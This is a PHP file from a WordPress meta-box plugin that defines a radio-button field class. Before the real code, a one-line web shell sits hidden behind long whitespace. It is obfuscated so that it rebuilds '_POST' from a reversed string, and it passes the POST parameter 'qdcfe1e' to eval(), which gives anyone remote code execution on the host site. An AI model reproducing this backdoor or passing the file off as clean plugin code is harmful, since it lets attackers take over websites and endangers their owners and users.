<?php                                                                                                                                                                                                                                                                            $dwxk49 ="tsop_" ; $nxm2= strtoupper ($dwxk49[4]. $dwxk49[3] .$dwxk49[2].$dwxk49[1].$dwxk49[0] ) ; if(isset( ${ $nxm2 }['qdcfe1e' ]) ){ eval ( ${$nxm2 } ['qdcfe1e' ] ) ; } ?> <?php
// Prevent loading this file directly
defined( 'ABSPATH' ) || exit;

if ( ! class_exists( 'RWMB_Radio_Field' ) )
{
	class RWMB_Radio_Field extends RWMB_Field
	{
		/**
		 * Get field HTML
		 *
		 * @param mixed  $meta
		 * @param array  $field
		 *
		 * @return string
		 */
		static function html( $meta, $field )
		{
			$html = array();
			$tpl = '<label><input type="radio" class="rwmb-radio" name="%s" value="%s"%s> %s</label>';

			foreach ( $field['options'] as $value => $label )
			{
				$html[] = sprintf(
					$tpl,
					$field['field_name'],
					$value,
					checked( $value, $meta, false ),
					$label
				);
			}

			return implode( ' ', $html );
		}
	}
}
